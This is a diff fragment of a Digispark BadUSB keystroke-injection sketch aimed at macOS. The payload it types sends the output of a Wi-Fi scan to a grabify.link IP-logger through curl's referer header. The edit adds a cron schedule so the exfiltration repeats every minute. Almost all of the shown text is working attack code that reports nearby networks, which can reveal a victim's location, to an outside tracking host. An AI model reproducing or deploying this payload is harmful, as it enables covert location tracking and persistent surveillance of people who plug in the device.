@@ -15,7 +15,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("curl --silent --output /dev/null --referer \'$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d | xargs | tr -d ' ' | tr -d '-')\' https://grabify.link/LINK");
+  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \'$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d | xargs | tr -d ' ' | tr -d '-')\' https://grabify.link/LINK");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
   DigiKeyboard.delay(500);
